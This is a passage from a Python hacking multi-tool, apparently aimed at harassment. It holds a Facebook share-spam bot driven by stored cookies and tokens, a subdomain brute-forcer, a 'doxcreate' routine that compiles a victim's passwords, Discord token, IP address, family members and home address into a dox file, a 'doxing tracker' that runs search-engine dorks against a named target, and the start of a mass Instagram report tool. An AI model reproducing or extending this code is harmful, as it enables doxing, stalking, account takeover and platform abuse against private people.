    print(f"{M}[{P}+{M}] {O}International format :{P} {formatted_number}")
    print(f"{M}[{P}+{M}] {O}Mobile format        :{P} {formatted_number_for_mobile}")
    print(f"{M}[{P}+{M}] {O}Original number      :{P} {parsed_number.national_number}")
    print(f"{M}[{P}+{M}] {O}Country code         :{P} {parsed_number.country_code}")
    print(f"{M}[{P}+{M}] {O}Local number         :{P} {parsed_number.national_number}")
    if number_type == phonenumbers.PhoneNumberType.MOBILE:
        print(f"{M}[{P}+{M}] {O}Type                 :{P} Mobile number")
    elif number_type == phonenumbers.PhoneNumberType.FIXED_LINE:
        print(f"{M}[{P}+{M}] {O}Type                 :{P} Fixed-line number")
    else:
        print(f"{M}[{P}+{M}] {O}Type                 :{P} Another type of number")
"""
dic  = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'};tgl = datetime.datetime.now().day;bln = dic[(str(datetime.datetime.now().month))];thn = datetime.datetime.now().year;dic2 = {'Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu','Sunday':'Minggu'};hari = dic2[(str(strftime("%A")))];input = Console(style='bold white').input;________ = __name__;_________ = '__main__'
"""
default_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
random_ua_windows = lambda : 'Mozilla/5.0 (Windows NT %s.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s.%s.%s.%s Safari/537.36'%(rc(['10','11']),rr(110,201),rr(0,10),rr(0,10),rr(0,10))
headers_get  = lambda i=default_ua_windows : {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Dpr':'1','Pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-True-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':i}
headers_post = lambda i=default_ua_windows : {'Accept':'*/*','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.facebook.com','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','User-Agent':i}

def GetData(req):
    actor = re.search('"actorID":"(.*?)"',str(req)).group(1)
    haste = re.search('"haste_session":"(.*?)"',str(req)).group(1)
    conne = re.search('"connectionClass":"(.*?)"',str(req)).group(1)
    spinr = re.search('"__spin_r":(.*?),',str(req)).group(1)
    spinb = re.search('"__spin_b":"(.*?)"',str(req)).group(1)
    spint = re.search('"__spin_t":(.*?),',str(req)).group(1)
    hsi = re.search('"hsi":"(.*?)"',str(req)).group(1)
    comet = re.search('"comet_env":(.*?),',str(req)).group(1)
    dtsg = re.search('{"token":"(.*?)"',str(req)).group(1)
    jazoest = re.search('&jazoest=(.*?)"',str(req)).group(1)
    lsd = re.search('"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1)
    dta  = {'av':actor,'__user':actor,'__a':'1','__hs':haste,'dpr':'1','__ccg':conne,'__rev':spinr,'__hsi':hsi,'__comet_req':comet,'fb_dtsg':dtsg,'jazoest':jazoest,'lsd':lsd,'__spin_r':spinr,'__spin_b':spinb,'__spin_t':spint}
    return(dta)
    
    
class ____________________________________________:
    def __init__(self):
        Console(width=55,style='bold white').print(panel('''Masukan Link Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold red]● [bold yellow]● [bold green]● [bold white]Masukan Link [bold red]●[bold yellow] ● [bold green]● '),justify='center');self.link_post = input('   └─> ');Console(width=55,style='bold white').print(panel('''Masukan Jumlah Share Postingan''',width=55,subtitle='┌',subtitle_align='left',title='[bold red]● [bold yellow]● [bold green]● [bold white]Masukan Jumlah [bold red]● [bold yellow]● [bold green]● '),justify='center');self.count = input('   └─> ');Console(width=55,style='bold white').print(panel('''Masukan Delay Share Postingan''',width=55,subtitle='┌',subtitle_align='left',title='[bold red]● [bold yellow]● [bold green]● [bold white]Masukan Delay [bold red]● [bold yellow]● [bold green]●'),justify='center');self.delay = input('   └─> ');self.r______ = requests.Session();self.cookie  = open('Data/fbshare/Cookie.txt', 'r').read();self.tokenku = open('Data/fbshare/Token.txt', 'r').read()
        self.ScrapComment()
        self.Selesai()
    def ScrapComment(self):
        success,failed = 0,0
        try:
            with self.r______ as r:
                for ___ in range(int(self.count)):
                    r.cookies.update({'cookie':self.cookie});response = r.post('https://graph.facebook.com/v13.0/me/feed?link={}&published=0&access_token={}'.format(self.link_post, self.tokenku)).text
                    if "id" in response:success+=1
                    elif 'error' in response:failed+=1
                    else:failed+=1
                    Console().print(f'   └─> Success : [bold green]{success}[bold white]|Failed : [bold red]{failed}[bold white]|Total : [bold blue]{self.count}       ',end='\r');time.sleep(int(self.delay))
        except KeyboardInterrupt:print('');Console(width=55).print(panel('[bold green]Selesai',width=55,style='bold white',title='[bold yellow]● [bold green]● [bold cyan]● [bold white]Success [bold cyan]● [bold green]● [bold yellow]●',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
    def Selesai(self):Console(width=55).print(panel('[bold green]Selesai',width=55,style='bold white',title='[bold yellow]● [bold green]● [bold cyan]● [bold white]Success [bold cyan]● [bold green]● [bold yellow]●',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');a()
        
def subdo(target_url):
    def request(url):
        try:
            return requests.get("http://" + url)
        except requests.exceptions.ConnectionError:
            pass
    
    # Check if the target URL is not empty
    if not target_url:
        print(f"{M}Error: Target URL cannot be empty.")
        Continue()
        a()
    
    # Open the wordlist file and check each subdomain
    with open("data/subdo.txt", "r") as wordlist_file:
        for line in wordlist_file:
            word = line.strip()
            if not word:  # Skip empty lines
                continue
            test_url = word + "." + target_url
            response = request(test_url)
            if response:
                print(f"{M}[{P}+{M}] Discovered subdomain ----> {H}{test_url}")
            

def doxcreate():
    clear()
    print(f"""{M}
    
▓█████▄  ▒█████  ▒██   ██▒    ▄████▄   ██▀███  ▓█████ ▄▄▄     ▄▄▄█████▓▓█████ 
▒██▀ ██▌▒██▒  ██▒▒▒ █ █ ▒░   ▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀▒████▄   ▓  ██▒ ▓▒▓█   ▀ 
░██   █▌▒██░  ██▒░░  █   ░   ▒▓█    ▄ ▓██ ░▄█ ▒▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒███   
░▓█▄   ▌▒██   ██░ ░ █ █ ▒    ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄ 
░▒████▓ ░ ████▓▒░▒██▒ ▒██▒   ▒ ▓███▀ ░░██▓ ▒██▒░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▒████▒
 ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░   ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░
 ░ ▒  ▒   ░ ▒ ▒░ ░░   ░▒ ░     ░  ▒     ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░   ░     ░ ░  ░
 ░ ░  ░ ░ ░ ░ ▒   ░    ░     ░          ░░   ░    ░    ░   ▒    ░         ░   
   ░        ░ ░   ░    ░     ░ ░         ░        ░  ░     ░  ░           ░  ░
 ░                           ░                         
""")
    print(M + f"\nVictim Information:\n")

    by = input(M + "Doxed By: " + M)
    cause = input(M + "Cause: " + M)
    
    print(K + "\nDiscord:")
    username_discord = input(M + "Username: " + M)
    name_discord = input(M + "Display Name: " + M)
    id_discord = input(M + "Id: " + M)
    token_discord = input(M + "Token: " + M)
    email_discord = input(M + "Email: " + M)
    password_discord = input(M + "Password: " + M)
    
    print(K + "\nPc:")
    ip_pc = input(M + "Ip: " + M)
    name_pc = input(M + "Name: " + M)
    os_pc = input(M + "Os: " + M)
    key_pc = input(M + "Windows Key: " + M)
    vpn_pc = input(M + "Vpn Y/N: " + M)
    
    print(K + "\nPhone:")
    number = input(M + "Phone Number: " + M)
    brand = input(M + "Brand: " + M)
    operator = input(M + "Operator: " + M)
    
    print(K + "\nPersonal:")
    last_name = input(M + "Last Name: " + M)
    first_name = input(M + "First Name: " + M)
    age = input(M + "Age:" + M)
    
    mother = input(M + "Mother: " + M)
    father = input(M + "Father: " + M)
    brother = input(M + "Brother: " + M)
    sister = input(M + "Sister: " + M)
    
    print(K + "\nLoc:")
    continent = input(M + "Continent: " + M)
    country = input(M + "Country: " + M)
    postal_code = input(M + "Postal Code: " + M)
    city = input(M + "City: " + M)
    address = input(M + "Adress: " + M)
    
    print(K + "\nAccounts")
    mail = input(M + "Mail: " + M)
    password = input(M + "Password: " + M)
    other = input(M + "\nOther: " + M)
    print(f"{M}Finished.")
    
    name_file = input(f"{M}\n{M} Choose the file name -> {M}")
    if not name_file.strip():
        name_file = f'No Name {random.randint(1, 999)}'
    
    path = f"./1-FileOutput/DoxCreate/D0x - {name_file}.txt"
    
    with open(path, 'w', encoding='utf-8') as file:
        file.write(f"""
     ██████╗   ██████╗  ██╗  ██╗
     ██╔══██╗ ██╔═████╗ ╚██╗██╔╝
     ██║  ██║ ██║██╔██║  ╚███╔╝ 
     ██║  ██║ ████╔╝██║  ██╔██╗ 
     ██████╔╝ ╚██████╔╝ ██╔╝ ██╗ By DarkStar
     ╚═════╝   ╚═════╝  ╚═╝  ╚═╝
    ╔══════════════════════╗
    ║|[+] Doxed By: {by}   ║
    ║|[+] Cause: {cause}   ║
    ╚══════════════════════╝
    
    ╓─────────────────────Discord──────────────────────╖
    ║|[+] Username: {username_discord}
    ║|[+] Display Name: {name_discord}
    ║|[+] ID: {id_discord}
    ║|[+] Token: {token_discord}
    ║|[+] E-Mail: {email_discord}
    ║|[+] Password: {password_discord}
    ╙────────────────────────────────────────────────╜
    
    ╓───────────────────────H──────────────────────╖
    ║+────────────Pc────────────+
    ║|[+] IP: {ip_pc}
    ║|[+] Name: {name_pc}
    ║|[+] OS: {os_pc}
    ║|[+] Windows Key: {key_pc}
    ║|[+] VPN Y/N: {vpn_pc}
    ║
    ║+───────────Phone──────────+
    ║|[+] Phone Number: {number}
    ║|[+] Brand: {brand}
    ║|[+] Operator: {operator}
    ║
    ║+───────────Personal───────+
    ║|[+] Last Name: {last_name}
    ║|[+] First Name: {first_name}
    ║|[+] Age: {age}
    ║
    ║|[+] Mother Y/N: {mother}
    ║|[+] Father Y/N: {father}
    ║|[+] Brother Y/N: {brother}
    ║|[+] Sister Y/N: {sister}
    ║
    ║+────────────Loc───────────+
    ║|[+] Continent: {continent}
    ║|[+] Country: {country}
    ║|[+] Postal Code: {postal_code}
    ║|[+] City: {city}
    ║|[+] Address: {address}
    ╙────────────────────────────────────────────────╜
    
    ╓─────────────────────Accounts─────────────────────╖
    ║+───────────Mail───────────+
    ║|[+] : {mail}
    ║
    ║+───────────Passwords──────+
    ║|[+] : {password}
    ║
    ║+───────────Others──────────+
    ║ {other}
    ╙────────────────────────────────────────────────╜""")
    
    print(M + f"{H} The DOX {P}\"{name_file}\"{M} was sent to: {P}\"{path}\""+ M)
def dox_trac():
    M = '\033[1;91m'
    white = '\033[0m'
    green = '\033[1;32m'
    yellow = '\033[1;33m'
    B = '\033[1;34m'
    M_t = '\033[0;31;40m'
    gray = '\033[1;37;40m'
    gold = '\033[0;33m'
    
    global user_agents
    user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
    
    print(f"""
    
    ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀
⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀
⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀
⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀
⠀⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀
⠀⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """)
    Write.Print(f"""
            DOXING TRACKER
                 V 1.3
               By: MrPstar7
    Note : Dont Do For Illegal Purpose !!
                               
""", Colors.red_to_yellow, interval=0.005)
    print(f"{O}1. Doxing With Name, Telephone Num, Gmail")
    print(f"2. {O}Doxing With Dorking")
    print(f"3. {O}Doxing With Information From Site")
    print(f"4. {O}Doxing With Youtube Channel's")
    print(f"5. {O}Doxing With Facebook")
    print(f"6. {O}Doxing With Instagram")
    print(f"7. {O}Doxing With Twitter")
    print(f"8. Bad Doxing")
    print(f"9. Little Doxing")
    print('')
    ic = Write.Input("Select Menu -> ", Colors.red_to_purple, interval=0.0025)
    
    if ic == "1":
        pass
        victim = input(f"\n{M}[{P}+{M}] {O}Enter a person's name (recommended use full name) : {P}")
        victim_numbers = input(f'\n{M}[{P}+{M}] {O}Enter Phone Number Target : {P}')
        victim_gmail = input(f'\n{M}[{P}+{M}] {O}Enter Gmail Target (optional) : {P}')
        dork = ['intext:', 'inurl:', 'index.php?id= intext:', 'intitle:', 'index.php?id intitle:', 'allintext:', 'allinurl:', 'allintitle:', 'inurl:user=']
        hehe = [f'{victim}, {victim_numbers}, {victim_gmail}']
        
        for doxing in hehe:
            try:
                for lsv in dork:
                    counter = 1
                    counter = counter + 1
                    file_exists = ('.google-cookie')
                    if file_exists == True:
                        os.remove(file_exists)
                    rand_user = random.choice(user_agents)
                    print(f'{M}[{P}+{M}] {O}Process {M}[{P}+{M}] {O}Searching : {P}', victim)
                    for results in search(f'{lsv} {doxing}', tld='com', num=2, start=0, stop=None, pause=2):
                        print(f'{H}Success : ')
                        print(results)
                    else:
                        error(f'Failed to Find, Please Wait ')
            except urllib.error.HTTPError as e:
                 if e.code == 404:
                     print(M + f' [404] Download Fail, Skipping')
                     continue
                 if e.code == 403:
                     print(M + f' [403] Download Fail, Skipping')
                     continue
                 if e.code == 429:
                     print(M + f' [429] Fail, Please Wait.')
                     time.sleep(5)
                     Continue()
                     a()
    elif ic == "2":
        target = input(f'\n{M}[{P}+{M}] {B}Enter Target Name : ')
        dork = ['intext :', 'inurl :', 'index.php?id= intext :', 'intitle :', 'index.php?id intitle :', 'allintext :', 'allinurl :', 'allintitle :', 'inurl:user=']
        
        requsts = 1
        requsts = requsts + 1
        
        for dor in dork:
            try:
                rand_user = random.choice(user_agents)
                file_exists = ('.google-cookie')
                if file_exists == True:
                    os.remove('.google-cookie')
                print(f'{M}[{P}+{M}] {O}Scanning {target} With Dork{H} {dor}{M}[{P}+{M}]')
                for results in search(f'{dor} {target}', tld='com', num=2, start=0, stop=None, pause=2):
                    print(H + f'Found ! ', results)
                else:
                    print(M + f'Not Found. Please Wait...')
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(M + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)
    elif ic == "3" or ic == "03":
        pass
        victm = input(f'\n{M}[{P}+{M}] {O}Enter Target : {P}')
        victm_addrs = input(f'\n{M}[{P}+{M}] {O}Target Address[Skip If U Dont Know] :{P} ')
        victm_mails = input(f'\n{M}[{P}+{M}] {O}Gmail Target : {P}')
        print(f"{H}Please Wait While Processing..")
    
        sites = (f'https://thatsthem.com/name/{victm}/{victm_addrs}')
        sites2 = (f'https://thatsthem.com/email/{victm_mails}')
        print(f'{K}Try To Get Here:')
        print(sites)
        print(sites2)
        Continue()
        a()
    elif ic == "4" or ic == "04":
        pass
        to_find = ['www.facebook.com', 'www.tiktok.com', 'www.twitter.com', 'www.instagram.com', 'sociabuzz.com']
        dorks = ['intext : ', 'inurl : ', 'intitle : ']
        yt_chnls = input(f'\n{M}[{P}+{M}] {K}Youtube Channels [Use https://]: ')
        for tof in to_find:
            pass
            for e in dorks:
                pass
                for page in search(f'site:{yt_chnls} {e}{tof}', tld='com',num=1, start=0, stop=None, pause=2):
                    print(f'{H}Page Found : {P}{tof}')
                    print(page)
    elif ic == "5" or ic == "05":
        pass
        fb1 = input(f'\n{M}[{P}+{M}] Name Target [Recommended To Use Full Name] : {P}')
        dorker = ['inurl:', 'intext:', 'intitle:']
        for y in dorker:
            pass
            for path in search(f'site:www.facebook.com {y}{fb1}', tld='com', num=1, start=0, stop=None, pause=2):
                print(f'{H}Found :')
                print(path)
                Continue()
                a()
            else:
                print(M + f'Cant Find {fb1}')
                Continue()
                a()
    elif ic == "6" or ic == "06":
        pass
        fb2 = input(f'\n{M}[{P}+{M}] {H}Name Target [Recommended To Use Full Name] : {P}')
        dorker = ['inurl:', 'intext:', 'intitle:']
        for y in dorker:
            pass
            for path in search(f'site:www.instagram.com {y}{fb2}', tld='com', num=1, start=0, stop=None, pause=2):
                print(f'{H}Found :')
                print(path)
                Continue()
                a()
            else:
                print(M + f'Cant Find {fb2}')
                Continue()
                a()
    elif ic == "7" or ic == "07":
        pass
        fb3 = input(f'\n{M}[{P}+{M}] {O}Name Target [Recommended To Use Full Name] : {K}')
        dorker = ['inurl:', 'intext:', 'intitle:']
        for y in dorker:
            pass
            for path in search(f'site:www.twitter.com {y}{fb3}', tld='com', num=1, start=0, stop=None, pause=2):
                print(f'{H}Found :')
                print(path)
            else:
                print(M + f'Cant Find {fb3}')
    elif ic == "8" or ic == "08":
        pass
        flol = input(f"{B}Target Name : ")
        print("{K}Please Wait...")
        e = [f'https://9gag.com/u/{flol}', f'https://{flol}.blogspot.com', f'https://www.linkedin.com/in/{flol}', f'https://about.me/{flol}']
        for res in e:
            response = requests.get(res)
            keyword = flol
            if response.status_code == 200:
                if re.search(keyword, response.text, re.IGNORECASE):
                    print(f"{M}[{P}+{M}] {H}Found!")
                    print(res)
                else:
                    print(M + f"Not Found")
            else:
                print(f'{M}Name {flol} Not Exists On {res}')
        time.sleep(1.2)
        for tes in search(f'intext:{flol}', num=1, pause=2, start=0, stop=None):
            print(f"{K}Find : ")
            print(tes)
    elif ic == "9" or ic == "09":
        victims = input(f"{M}[{P}+{M}] {B}Enter Target Name: ")
        try:
            print("{M}Wait.. Searching Info..")
            for results in search(f"intext:{victims}", tld='com', num=4, start=0, stop=None, pause=10):
                print(success + f"[ + ] Found! [ + ]")
                print(results)
                keywords = ['Location', 'Gmail', 'Email', 'PhoneNumbers', 'Phone', 'Number', 'Address', 'Data', 'ID', 'card']
                for uhh in keywords:
                    session = requests.session()
                    response = requests.get(results)
                    print(B + f" Checking For Columns Name {uhh}")
                    if re.search(uhh, response.text, re.IGNORECASE):
                        print(f"{M}Columns {uhh} Exists !")
            print(f"{M}[{P}+{M}] {O} Little Doxing Done.. {M}[{P}+{M}] {O}")
            Continue()
            a()
        except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(M + f'[429] Too Many Request, Please Wait')
                    time.sleep(4)
                    Continue()
                    a()
def logo_ig():
    Write.Print(f"""

      ___ ___ ___  ___  ___ _____           
     | _ \ __| _ \/ _ \| _ \_   _|          
     |   / _||  _/ (_) |   / | |            
___ _  |_|_\___|_| _\___/|_|_\ |_|_   __  __  
|_ _| \| / __|_   _/_\ / __| _ \  /_\ |  \/  | 
| || .` \__ \ | |/ _ \ (_ |   / / _ \| |\/| | 
|___|_|\_|___/ |_/_/ \_\___|_|_\/_/ \_\_|  |_| 

WELCOME TO TOOLS REPORT INSTAGRAM 
                               
""", Colors.red_to_yellow, interval=0.0025)
    
def report_ig(user, name):
    
    head={
        "Host": "help.instagram.com",
        "content-length": "715",
        "x-fb-lsd": "AVq5uabXj48",
        "x-asbd-id": "129477",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
        "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
